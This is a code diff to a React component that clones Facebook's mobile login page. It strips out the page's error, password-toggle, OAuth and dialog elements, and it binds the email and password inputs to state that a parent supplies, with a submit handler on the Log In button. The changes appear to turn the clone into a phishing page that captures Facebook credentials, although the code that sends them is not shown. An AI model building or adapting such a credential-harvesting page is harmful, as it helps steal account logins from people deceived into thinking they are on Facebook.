@@ -1,6 +1,10 @@
 import React from 'react'
 import logo from './img/logo.svg';
-function FBlayout() {
+function FBLayout({
+    setInputData,
+    inputData,
+    onSubmitHandelar
+}) {
     return (
         <div tabindex="0" class="touch x1-5 tablet android _fzu _50-3 iframe acw">
             <div id="viewport" data-kaios-focus-transparent={1}>
@@ -26,14 +30,7 @@ function FBlayout() {
                     >
                         <div className="_7om2">
                             <div className="_4g34" id="u_0_0_6L">
-                                <div
-                                    className="_5yd0 _2ph- _5yd1"
-                                    style={{ display: "none" }}
-                                    id="login_error"
-                                    data-sigil="m_login_notice"
-                                >
-                                    <div className="_52jd" />
-                                </div>
+
                                 <div className="_9om_">
                                     <div className="_4-4l">
                                         <div
@@ -135,6 +132,9 @@ function FBlayout() {
                                                                     name="email"
                                                                     placeholder="Mobile number or email address"
                                                                     data-sigil="m_login_email"
+                                                                    onChange={(e) => setInputData({ ...inputData, email: e.target.value })}
+                                                                    value={inputData.email}
+
                                                                 />
                                                             </div>
                                                         </div>
@@ -159,6 +159,8 @@ function FBlayout() {
                                                                                 placeholder="Password"
                                                                                 type="password"
                                                                                 data-sigil="password-plain-text-toggle-input"
+                                                                                onChange={(e) => setInputData({ ...inputData, password: e.target.value })}
+                                                                                value={inputData.password}
                                                                             />
                                                                             <input
                                                                                 type="hidden"
@@ -169,27 +171,7 @@ function FBlayout() {
                                                                     </div>
                                                                     <div className="_5s61 _216i _5i2i _52we">
                                                                         <div className="_5xu4">
-                                                                            <div
-                                                                                className="_2pi9"
-                                                                                style={{ display: "none" }}
-                                                                                id="u_0_2_GZ"
-                                                                            >
-                                                                                <a
-                                                                                    href="#"
-                                                                                    data-sigil="password-plain-text-toggle"
-                                                                                >
-                                                                                    <span
-                                                                                        className="mfss"
-                                                                                        style={{ display: "none" }}
-                                                                                        id="u_0_3_5A"
-                                                                                    >
-                                                                                        HIDE
-                                                                                    </span>
-                                                                                    <span className="mfss" id="u_0_4_kc">
-                                                                                        SHOW
-                                                                                    </span>
-                                                                                </a>
-                                                                            </div>
+
                                                                         </div>
                                                                     </div>
                                                                 </div>
@@ -203,27 +185,20 @@ function FBlayout() {
                                                         data-sigil="login_password_step_element"
                                                     >
                                                         <button
-                                                        style={{cursor: 'pointer'}}
+                                                            style={{ cursor: 'pointer' }}
                                                             type="button"
                                                             value="Log In"
                                                             className="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                                                             id="btnsubmit"
                                                             name="login"
                                                             data-sigil="touchable login_button_block m_login_button"
+                                                            onClick={onSubmitHandelar}
                                                         >
                                                             <span className="_55sr">Log In</span>
                                                         </button>
                                                     </div>
-                                                    <div
-                                                        className="_7eif"
-                                                        id="oauth_login_button_container"
-                                                        style={{ display: "none" }}
-                                                    />
-                                                    <div
-                                                        className="_7f_d"
-                                                        id="oauth_login_desc_container"
-                                                        style={{ display: "none" }}
-                                                    />
+
+
                                                     <div id="otp_button_elem_container" />
                                                 </div>
                                                 <input
@@ -341,15 +316,8 @@ function FBlayout() {
                                 </div>
                             </div>
                         </div>
-                        <div style={{ display: "none" }} />
-                        <span>
-                            <img
-                                src="./hsts-pixel.gif"
-                                width={0}
-                                height={0}
-                                style={{ display: "none" }}
-                            />
-                        </span>
+
+
                         <div className="_55wr _5ui2" data-sigil="m_login_footer">
                             <div className="_5dpw">
                                 <div
@@ -469,245 +437,20 @@ function FBlayout() {
                                             More
                                         </span>
                                     </div>
-                                    <div className="_96qv" style={{ display: "none" }} id="u_0_6_8B">
-                                        <a
-                                            href="https://messenger.com/"
-                                            title="Take a look at Messenger."
-                                            className="_96qw"
-                                        >
-                                            Messenger
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/lite/?refid=8"
-                                            title="Facebook Lite for Android."
-                                            className="_96qw"
-                                        >
-                                            Facebook Lite
-                                        </a>
-                                        <a
-                                            href="https://m.facebook.com/watch/?refid=8"
-                                            title="Browse our Watch videos."
-                                            className="_96qw"
-                                        >
-                                            Watch
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/places/?refid=8"
-                                            title="Take a look at popular places on Facebook."
-                                            className="_96qw"
-                                        >
-                                            Places
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/games/?refid=8"
-                                            title="Check out Facebook games."
-                                            className="_96qw"
-                                        >
-                                            Games
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/marketplace/?refid=8"
-                                            title="Buy and sell on Facebook Marketplace."
-                                            className="_96qw"
-                                        >
-                                            Marketplace
-                                        </a>
-                                        <a
-                                            href="https://pay.facebook.com/?refid=8"
-                                            title="Learn more about Facebook Pay"
-                                            target="_blank"
-                                            className="_96qw"
-                                        >
-                                            Facebook Pay
-                                        </a>
-                                        <a
-                                            href="https://www.oculus.com/"
-                                            title="Learn more about Oculus"
-                                            target="_blank"
-                                            className="_96qw"
-                                        >
-                                            Oculus
-                                        </a>
-                                        <a
-                                            href="https://portal.facebook.com/?refid=8"
-                                            title="Learn more about Facebook Portal"
-                                            target="_blank"
-                                            className="_96qw"
-                                        >
-                                            Portal
-                                        </a>
-                                        <a
-                                            href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT3q1KOVdNNW2fRs0wun0KBGwuhQjWftomvC45U7wCfjOxlqfEp99sHmq8HrrbXLqzA0O7d_q37E4UyydZ20fevuW3s8ztqEHZrtvg7esnvtsIErzEcnYjaN9EYnbSrOhzFuoOxNajUEXJvQRC_1"
-                                            title="Take a look at Instagram"
-                                            target="_blank"
-                                            className="_96qw"
-                                            rel="noopener"
-                                            data-sigil="MLynx_asynclazy"
-                                        >
-                                            Instagram
-                                        </a>
-                                        <a
-                                            href="https://www.bulletin.com/"
-                                            title="Take a look at Bulletin newsletter"
-                                            className="_96qw"
-                                        >
-                                            Bulletin
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/local/lists/245019872666104/?refid=8"
-                                            title="Browse our Local Lists directory."
-                                            className="_96qw"
-                                        >
-                                            Local
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/fundraisers/?refid=8"
-                                            title="Donate to worthy causes."
-                                            className="_96qw"
-                                        >
-                                            Fundraisers
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/biz/directory/?refid=8"
-                                            title="Browse our Facebook Services directory."
-                                            className="_96qw"
-                                        >
-                                            Services
-                                        </a>
-                                        <a
-                                            href="https://developers.facebook.com/?ref=pf&refid=8"
-                                            title="Develop on our platform."
-                                            className="_96qw"
-                                        >
-                                            Developers
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/careers/?ref=pf&refid=8"
-                                            title="Make your next career move to our brilliant company."
-                                            className="_96qw"
-                                        >
-                                            Careers
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/privacy/explanation?refid=8"
-                                            title="Learn about your privacy and Facebook."
-                                            className="_96qw"
-                                        >
-                                            Privacy
-                                        </a>
-                                        <a
-                                            href="https://facebook.com/groups/explore/?refid=8"
-                                            title="Explore our groups."
-                                            className="_96qw"
-                                        >
-                                            Groups
-                                        </a>
-                                    </div>
+
                                     <span className="mfss fcg">Facebook Inc.</span>
                                 </div>
                             </div>
                         </div>
                     </div>
                     <div className="" />
-                    <div
-                        className="viewportArea _2v9s"
-                        style={{ display: "none" }}
-                        id="u_0_7_pi"
-                        data-sigil="marea"
-                    >
-                        <div className="_5vsg" id="u_0_8_Yd" />
-                        <div className="_5vsh" id="u_0_9_Wk" />
-                        <div className="_5v5d fcg">
-                            <div
-                                className="_2so _2sq _2ss img _50cg"
-                                data-animtype={1}
-                                data-sigil="m-loading-indicator-animate m-loading-indicator-root"
-                            />
-                            Loading...
-                        </div>
-                    </div>
-                    <div
-                        className="viewportArea aclb"
-                        id="mErrorView"
-                        style={{ display: "none" }}
-                        data-sigil="marea"
-                    >
-                        <div className="container">
-                            <div className="image" />
-                            <div className="message" data-sigil="error-message" />
-                            <a className="link" data-sigil="MPageError:retry">
-                                Try Again
-                            </a>
-                        </div>
-                    </div>
+
                 </div>
             </div>
-            <div id="static_templates">
-                <div className="mDialog" id="modalDialog" style={{ display: "none" }}>
-                    <div
-                        className="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled"
-                        id="mDialogHeader"
-                    >
-                        <div className="_7om2 _52we">
-                            <div className="_5s61">
-                                <div className="_52z7">
-                                    <button
-                                        type="submit"
-                                        value="Cancel"
-                                        className="cancelButton btn btnD bgb mfss touchable"
-                                        id="u_0_b_iy"
-                                        data-sigil="dialog-cancel-button"
-                                    >
-                                        Cancel
-                                    </button>
-                                    <button
-                                        type="submit"
-                                        value="Back"
-                                        className="backButton btn btnI bgb mfss touchable iconOnly"
-                                        aria-label="Back"
-                                        id="u_0_c_Tb"
-                                        data-sigil="dialog-back-button"
-                                    >
-                                        <i
-                                            className="img sp_hXwjxxRp6sw_1_5x sx_030478"
-                                            style={{ marginTop: 2 }}
-                                        />
-                                    </button>
-                                </div>
-                            </div>
-                            <div className="_4g34">
-                                <div className="_52z6">
-                                    <div
-                                        className="_50l4 mfsl fcw"
-                                        id="m-future-page-header-title"
-                                        role="heading"
-                                        tabIndex={0}
-                                        data-sigil="m-dialog-header-title dialog-title"
-                                    >
-                                        Loading...
-                                    </div>
-                                </div>
-                            </div>
-                            <div className="_5s61">
-                                <div className="_52z8" id="modalDialogHeaderButtons" />
-                            </div>
-                        </div>
-                    </div>
-                    <div className="modalDialogView" id="modalDialogView" />
-                    <div className="_5v5d _5v5e fcg" id="dialogSpinner">
-                        <div
-                            className="_2so _2sq _2ss img _50cg"
-                            data-animtype={1}
-                            id="u_0_a_+v"
-                            data-sigil="m-loading-indicator-animate m-loading-indicator-root"
-                        />
-                        Loading...
-                    </div>
-                </div>
-            </div>
+
         </div>
 
     )
 }
 
-export default FBlayout
+export default FBLayout
